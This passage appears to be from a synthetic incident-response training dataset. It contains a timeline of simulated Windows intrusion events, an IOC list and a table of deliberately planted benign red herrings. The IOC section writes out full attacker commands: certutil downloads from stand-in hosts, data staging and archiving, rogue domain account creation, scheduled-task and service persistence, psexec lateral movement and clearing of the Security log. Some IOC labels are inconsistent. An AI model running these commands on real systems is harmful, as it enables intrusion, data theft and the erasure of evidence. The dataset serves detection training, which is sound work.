| 2026-08-17 21:00:14 UTC | kabir.chauhan | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-18 04:49:32 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Program Files\7-Zip\7z.exe (PID: 29620) - `7z.exe a C:\ProgramData\Cache\bundle_21049.7z C...` |
| 2026-08-18 04:50:02 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\certutil.exe (PID: 29648) - `certutil.exe -urlcache -split -f https://upload...` |
| 2026-08-18 04:50:27 UTC | ishita.kapoor | PC-001 | Connection | Connection to 198.51.100.135:443 (UID: (filtered by sensor placement)) |
| 2026-08-18 09:20:07 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 15692) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-18 09:20:15 UTC | diya.singh | PC-004 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck21050 |
| 2026-08-18 15:09:45 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 7152) - `net user svc-ns-maint-21051 /add /domain` |
| 2026-08-18 15:09:50 UTC | aditya.saxena | DC-01 | Account_Created | Account created: svc-ns-maint-21051 |
| 2026-08-18 15:10:14 UTC | aditya.saxena | DC-01 | Group_Member_Added | Added svc-ns-maint-21051 to group Remote Desktop Users |
| 2026-08-19 04:09:35 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\whoami.exe (PID: 27156) - `whoami /all` |
| 2026-08-19 04:10:10 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\systeminfo.exe (PID: 27164) - `systeminfo` |
| 2026-08-19 04:10:18 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\net.exe (PID: 27176) - `net group "Domain Admins" /domain` |
| 2026-08-19 04:10:48 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\nltest.exe (PID: 27188) - `nltest /dclist:corp.local` |
| 2026-08-19 11:10:06 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 4968) - `sc.exe create NorthsideTelemetry22053 binPath= ...` |
| 2026-08-19 11:10:15 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry22053 (C:\ProgramData\Ops\agent_22053.exe) |
| 2026-08-19 17:59:52 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 35688) - `diag-helper.exe --inspect-session` |
| 2026-08-19 18:00:24 UTC | ishita.kapoor | PC-001 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-19 21:59:36 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 7448) - `sc.exe create NorthsideTelemetry22055 binPath= ...` |
| 2026-08-19 21:59:55 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry22055 (C:\ProgramData\Ops\agent_22055.exe) |
| 2026-08-20 01:00:11 UTC | prerna.verma | FILE-01 | Logon | Network logon from 10.10.10.28 (LogonID: 0x14e61096) |
| 2026-08-20 01:00:39 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 8128) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-20 01:00:57 UTC | prerna.verma | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-20 04:39:39 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 34680) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-20 04:40:08 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-20 04:40:34 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-20 04:41:03 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-20 04:41:12 UTC | vivaan.sharma | PC-003 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-20 15:49:33 UTC | prerna.verma | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 11196) - `sc.exe create NorthsideTelemetry23058 binPath= ...` |
| 2026-08-20 15:49:58 UTC | prerna.verma | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry23058 (C:\ProgramData\Ops\agent_23058.exe) |
| 2026-08-21 05:20:10 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Program Files\7-Zip\7z.exe (PID: 41828) - `7z.exe a C:\ProgramData\Cache\bundle_24059.7z C...` |
| 2026-08-21 05:20:39 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\System32\certutil.exe (PID: 41872) - `certutil.exe -urlcache -split -f https://upload...` |
| 2026-08-21 05:20:52 UTC | aarav.malhotra | PC-002 | Connection | Connection to 192.0.2.202:443 (UID: (filtered by sensor placement)) |
| 2026-08-21 07:20:00 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 30516) - `net user svc-ns-maint-24060 /add /domain` |
| 2026-08-21 07:20:27 UTC | aditya.saxena | DC-01 | Account_Created | Account created: svc-ns-maint-24060 |
| 2026-08-21 07:20:58 UTC | aditya.saxena | DC-01 | Group_Member_Added | Added svc-ns-maint-24060 to group Remote Desktop Users |
| 2026-08-21 09:39:45 UTC | prerna.verma | PC-008 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 50168) - `diag-helper.exe --inspect-session` |
| 2026-08-21 09:40:00 UTC | prerna.verma | PC-008 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-21 12:19:51 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 32532) - `wevtutil cl Security` |
| 2026-08-21 12:20:08 UTC | aditya.saxena | DC-01 | Log_Cleared | Windows Security event log cleared after administrative command activity |
| 2026-08-22 10:59:45 UTC | aditya.saxena | FILE-01 | Logon | Network logon from 10.10.10.27 (LogonID: 0x1698fec7) |
| 2026-08-22 11:00:07 UTC | aditya.saxena | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 20388) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-22 11:00:27 UTC | aditya.saxena | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-22 19:39:40 UTC | aarav.malhotra | FILE-01 | Logon | Network logon from 10.10.10.22 (LogonID: 0x16d9f639) |
| 2026-08-22 19:40:06 UTC | aarav.malhotra | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 22036) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-22 19:40:39 UTC | aarav.malhotra | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-22 22:49:53 UTC | kabir.chauhan | PC-005 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 44700) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-22 22:50:24 UTC | kabir.chauhan | PC-005 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck25065 |
| 2026-08-23 02:09:46 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 47512) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-23 02:10:13 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-23 02:10:23 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-23 02:10:41 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-23 02:11:02 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-23 08:10:20 UTC | SYSTEM | DC-01 | Credential_Spray | Credential spray: 9 attempts against 8 accounts (success: meera.bansal at attempt 9) |
| 2026-08-23 11:30:02 UTC | aditya.saxena | PC-007 | Process | Process: C:\Program Files\7-Zip\7z.exe (PID: 53588) - `7z.exe a C:\ProgramData\Cache\bundle_26068.7z C...` |
| 2026-08-23 11:30:07 UTC | aditya.saxena | PC-007 | Process | Process: C:\Windows\System32\certutil.exe (PID: 53620) - `certutil.exe -urlcache -split -f https://upload...` |
| 2026-08-23 11:30:16 UTC | aditya.saxena | PC-007 | Connection | Connection to 198.51.100.133:443 (UID: (filtered by sensor placement)) |
| 2026-08-23 21:59:38 UTC | aarav.malhotra | PC-002 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 50540) - `diag-helper.exe --inspect-session` |
| 2026-08-23 22:00:12 UTC | aarav.malhotra | PC-002 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-24 01:20:16 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 53168) - `wevtutil cl Security` |
| 2026-08-24 01:20:28 UTC | prerna.verma | DC-01 | Log_Cleared | Windows Security event log cleared after administrative command activity |
| 2026-08-24 16:29:54 UTC | aditya.saxena | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 32152) - `sc.exe create NorthsideTelemetry27071 binPath= ...` |
| 2026-08-24 16:30:13 UTC | aditya.saxena | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry27071 (C:\ProgramData\Ops\agent_27071.exe) |
| 2026-08-24 21:20:03 UTC | diya.singh | PC-004 | Process | Process: C:\Windows\Temp\diag-helper.exe (PID: 58796) - `diag-helper.exe --inspect-session` |
| 2026-08-24 21:20:10 UTC | diya.singh | PC-004 | Create_Remote_Thread | Remote thread injection into C:\Windows\System32\lsass.exe |
| 2026-08-25 06:00:17 UTC | prerna.verma | PC-008 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 65064) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-25 06:00:40 UTC | prerna.verma | PC-008 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck28073 |
| 2026-08-25 09:40:09 UTC | aditya.saxena | FILE-01 | Process | Process: C:\Windows\System32\sc.exe (PID: 35964) - `sc.exe create NorthsideTelemetry28074 binPath= ...` |
| 2026-08-25 09:40:41 UTC | aditya.saxena | FILE-01 | Service_Installed | Service installed: NorthsideTelemetry28074 (C:\ProgramData\Ops\agent_28074.exe) |
| 2026-08-25 17:59:36 UTC | meera.bansal | FILE-01 | Logon | Network logon from 10.10.10.26 (LogonID: 0x18e97d21) |
| 2026-08-25 17:59:41 UTC | meera.bansal | FILE-01 | Process | Process: C:\Windows\System32\robocopy.exe (PID: 37776) - `robocopy \\FILE-01\Shared C:\ProgramData\Cache\...` |
| 2026-08-25 18:00:16 UTC | meera.bansal | FILE-01 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-25 22:00:17 UTC | ishita.kapoor | PC-001 | Process | Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe (PID: 58140) - `powershell.exe -NoProfile -Command "Test-NetCon...` |
| 2026-08-25 22:00:49 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.20:445 (UID: (filtered by sensor placement)) |
| 2026-08-25 22:01:23 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.30:1433 (UID: (filtered by sensor placement)) |
| 2026-08-25 22:01:28 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.40:5985 (UID: (filtered by sensor placement)) |
| 2026-08-25 22:01:43 UTC | ishita.kapoor | PC-001 | Connection | Connection to 10.10.20.10:3389 (UID: (filtered by sensor placement)) |
| 2026-08-26 08:59:52 UTC | aditya.saxena | DC-01 | Process | Process: C:\Windows\System32\wevtutil.exe (PID: 10220) - `wevtutil cl Security` |
| 2026-08-26 09:00:13 UTC | aditya.saxena | DC-01 | Log_Cleared | Windows Security event log cleared after administrative command activity |
| 2026-08-26 15:40:08 UTC | prerna.verma | DC-01 | Process | Process: C:\Windows\System32\net.exe (PID: 12180) - `net user svc-ns-maint-29078 /add /domain` |
| 2026-08-26 15:40:23 UTC | prerna.verma | DC-01 | Account_Created | Account created: svc-ns-maint-29078 |
| 2026-08-26 15:40:52 UTC | prerna.verma | DC-01 | Group_Member_Added | Added svc-ns-maint-29078 to group Remote Desktop Users |
| 2026-08-26 20:00:00 UTC | vivaan.sharma | PC-003 | Process | Process: C:\Windows\System32\schtasks.exe (PID: 14496) - `schtasks.exe /Create /TN "\Microsoft\Windows\Ma...` |
| 2026-08-26 20:00:33 UTC | vivaan.sharma | PC-003 | Scheduled_Task_Created | Scheduled task created: \Microsoft\Windows\Maintenance\HealthCheck29079 |


## Indicators of Compromise (IOCs)

### Network IOCs

- 10.10.10.21 (Attacker IP)
- 10.10.10.22 (Attacker IP)
- 10.10.10.25 (Attacker IP)
- 10.10.10.26 (Attacker IP)
- 10.10.10.27 (Attacker IP)
- 10.10.10.28 (Attacker IP)
- 10.10.20.10:3389 (Internal Server)
- 10.10.20.20:445 (Internal Server)
- 10.10.20.30:1433 (Internal Server)
- 10.10.20.40:5985 (Internal Server)
- 192.0.2.202:443 (Internal Server)
- 192.0.2.207:443 (Internal Server)
- 198.51.100.133:443 (Internal Server)
- 198.51.100.135:443 (Internal Server)
- 198.51.100.37:443 (Internal Server)

### Process IOCs

- C:\Program Files\7-Zip\7z.exe
- C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
- C:\Windows\System32\certutil.exe
- C:\Windows\System32\net.exe
- C:\Windows\System32\nltest.exe
- C:\Windows\System32\robocopy.exe
- C:\Windows\System32\sc.exe
- C:\Windows\System32\schtasks.exe
- C:\Windows\System32\systeminfo.exe
- C:\Windows\System32\wevtutil.exe
- C:\Windows\System32\whoami.exe
- C:\Windows\Temp\diag-helper.exe
- C:\Windows\Temp\psexec.exe
- Injection Target: C:\Windows\System32\lsass.exe
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck08003
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck12019
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck14027
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck15028
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck18041
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck20047
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck21050
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck25065
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck28073
- Scheduled Task: \Microsoft\Windows\Maintenance\HealthCheck29079
- Service: NorthsideTelemetry07000
- Service: NorthsideTelemetry07002
- Service: NorthsideTelemetry11014
- Service: NorthsideTelemetry13022
- Service: NorthsideTelemetry22053
- Service: NorthsideTelemetry22055
- Service: NorthsideTelemetry23058
- Service: NorthsideTelemetry27071
- Service: NorthsideTelemetry28074
- `7z.exe a C:\ProgramData\Cache\bundle_10012.7z C:\ProgramData\Cache\*.csv`
- `7z.exe a C:\ProgramData\Cache\bundle_11015.7z C:\ProgramData\Cache\*.csv`
- `7z.exe a C:\ProgramData\Cache\bundle_21049.7z C:\ProgramData\Cache\*.csv`
- `7z.exe a C:\ProgramData\Cache\bundle_24059.7z C:\ProgramData\Cache\*.csv`
- `7z.exe a C:\ProgramData\Cache\bundle_26068.7z C:\ProgramData\Cache\*.csv`
- `certutil.exe -urlcache -split -f https://upload-10012.example/object C:\ProgramData\Cache\object_10012.bin`
- `certutil.exe -urlcache -split -f https://upload-11015.example/object C:\ProgramData\Cache\object_11015.bin`
- `certutil.exe -urlcache -split -f https://upload-21049.example/object C:\ProgramData\Cache\object_21049.bin`
- `certutil.exe -urlcache -split -f https://upload-24059.example/object C:\ProgramData\Cache\object_24059.bin`
- `certutil.exe -urlcache -split -f https://upload-26068.example/object C:\ProgramData\Cache\object_26068.bin`
- `diag-helper.exe --inspect-session`
- `net group "Domain Admins" /domain`
- `net user svc-ns-maint-08004 /add /domain`
- `net user svc-ns-maint-09008 /add /domain`
- `net user svc-ns-maint-12017 /add /domain`
- `net user svc-ns-maint-15029 /add /domain`
- `net user svc-ns-maint-17035 /add /domain`
- `net user svc-ns-maint-19042 /add /domain`
- `net user svc-ns-maint-21051 /add /domain`
- `net user svc-ns-maint-24060 /add /domain`
- `net user svc-ns-maint-29078 /add /domain`
- `nltest /dclist:corp.local`
- `powershell.exe -NoProfile -Command "Test-NetConnection 10.10.20.20 -Port 445; Test-NetConnection 10.10.20.30 -Port 1433; Test-NetConnection 10.10.20.40 -Port 5985; Test-NetConnection 10.10.20.10 -Port 3389"`
- `psexec.exe \\FILE-01 -u CORP\aditya.saxena cmd.exe`
- `psexec.exe \\FILE-01 -u CORP\prerna.verma cmd.exe`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_08005 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_10010 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_14026 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_16032 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_18038 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_20048 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_23056 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_25063 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_25064 /E /R:1 /W:1`
- `robocopy \\FILE-01\Shared C:\ProgramData\Cache\stage_28075 /E /R:1 /W:1`
- `sc.exe create NorthsideTelemetry07000 binPath= C:\ProgramData\Ops\agent_07000.exe start= auto`
- `sc.exe create NorthsideTelemetry07002 binPath= C:\ProgramData\Ops\agent_07002.exe start= auto`
- `sc.exe create NorthsideTelemetry11014 binPath= C:\ProgramData\Ops\agent_11014.exe start= auto`
- `sc.exe create NorthsideTelemetry13022 binPath= C:\ProgramData\Ops\agent_13022.exe start= auto`
- `sc.exe create NorthsideTelemetry22053 binPath= C:\ProgramData\Ops\agent_22053.exe start= auto`
- `sc.exe create NorthsideTelemetry22055 binPath= C:\ProgramData\Ops\agent_22055.exe start= auto`
- `sc.exe create NorthsideTelemetry23058 binPath= C:\ProgramData\Ops\agent_23058.exe start= auto`
- `sc.exe create NorthsideTelemetry27071 binPath= C:\ProgramData\Ops\agent_27071.exe start= auto`
- `sc.exe create NorthsideTelemetry28074 binPath= C:\ProgramData\Ops\agent_28074.exe start= auto`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck08003" /TR "C:\ProgramData\Cache\health_08003.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck12019" /TR "C:\ProgramData\Cache\health_12019.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck14027" /TR "C:\ProgramData\Cache\health_14027.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck15028" /TR "C:\ProgramData\Cache\health_15028.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck18041" /TR "C:\ProgramData\Cache\health_18041.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck20047" /TR "C:\ProgramData\Cache\health_20047.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck21050" /TR "C:\ProgramData\Cache\health_21050.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck25065" /TR "C:\ProgramData\Cache\health_25065.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck28073" /TR "C:\ProgramData\Cache\health_28073.exe" /SC HOURLY /RU SYSTEM`
- `schtasks.exe /Create /TN "\Microsoft\Windows\Maintenance\HealthCheck29079" /TR "C:\ProgramData\Cache\health_29079.exe" /SC HOURLY /RU SYSTEM`
- `systeminfo`
- `wevtutil cl Security`
- `whoami /all`

### User IOCs

- Group: Remote Desktop Users (compromised account)
- SYSTEM (compromised account)
- aarav.malhotra (compromised account)
- aarav.malhotra (Spray Target) (compromised account)
- aditya.saxena (compromised account)
- aditya.saxena (Explicit Credential Target) (compromised account)
- aditya.saxena (Spray Target) (compromised account)
- diya.singh (compromised account)
- diya.singh (Spray Target) (compromised account)
- ishita.kapoor (compromised account)
- ishita.kapoor (Spray Target) (compromised account)
- kabir.chauhan (compromised account)
- kabir.chauhan (Spray Target) (compromised account)
- meera.bansal (compromised account)
- meera.bansal (Spray Target) (compromised account)
- prerna.verma (compromised account)
- prerna.verma (Explicit Credential Target) (compromised account)
- prerna.verma (Spray Target) (compromised account)
- svc-ns-maint-08004 (compromised account)
- svc-ns-maint-09008 (compromised account)
- svc-ns-maint-12017 (compromised account)
- svc-ns-maint-15029 (compromised account)
- svc-ns-maint-17035 (compromised account)
- svc-ns-maint-19042 (compromised account)
- svc-ns-maint-21051 (compromised account)
- svc-ns-maint-24060 (compromised account)
- svc-ns-maint-29078 (compromised account)
- vivaan.sharma (compromised account)
- vivaan.sharma (Spray Target) (compromised account)

### File IOCs

- C:\ProgramData\Ops\agent_07000.exe
- C:\ProgramData\Ops\agent_07002.exe
- C:\ProgramData\Ops\agent_11014.exe
- C:\ProgramData\Ops\agent_13022.exe
- C:\ProgramData\Ops\agent_22053.exe
- C:\ProgramData\Ops\agent_22055.exe
- C:\ProgramData\Ops\agent_23058.exe
- C:\ProgramData\Ops\agent_27071.exe
- C:\ProgramData\Ops\agent_28074.exe
- C:\Windows\System32\cmd.exe


## Red Herrings

The following events appear suspicious but are benign. They are included to make the dataset more realistic.

| Timestamp | Actor | System | Activity | Why It's Benign |
|-----------|-------|--------|----------|-----------------|
| 2026-08-07 04:59:47 UTC | prerna.verma | PC-008 | Scheduled security audit performs normal domain inventory | Approved audit by the security analyst; discovery utilities can be legitimate. |
| 2026-08-07 04:59:54 UTC | prerna.verma | PC-008 | Scheduled security audit performs normal domain inventory | Approved audit by the security analyst; discovery utilities can be legitimate. |
| 2026-08-12 07:15:24 UTC | kabir.chauhan | PC-001 | Help-desk remote session to a finance workstation | Approved troubleshooting; a remote-session signal alone is not attack ground truth. |
| 2026-08-19 11:59:37 UTC | aditya.saxena | FILE-01 | Approved monthly server patching | Authorized maintenance; process activity is not service creation or persistence. |
| 2026-08-19 11:59:39 UTC | aditya.saxena | FILE-01 | Approved monthly server patching | Authorized maintenance; process activity is not service creation or persistence. |
| 2026-08-24 04:20:04 UTC | ishita.kapoor | PC-001 | Routine PowerShell inventory of running processes | Normal local inventory without a linked external connection or persistence signal. |
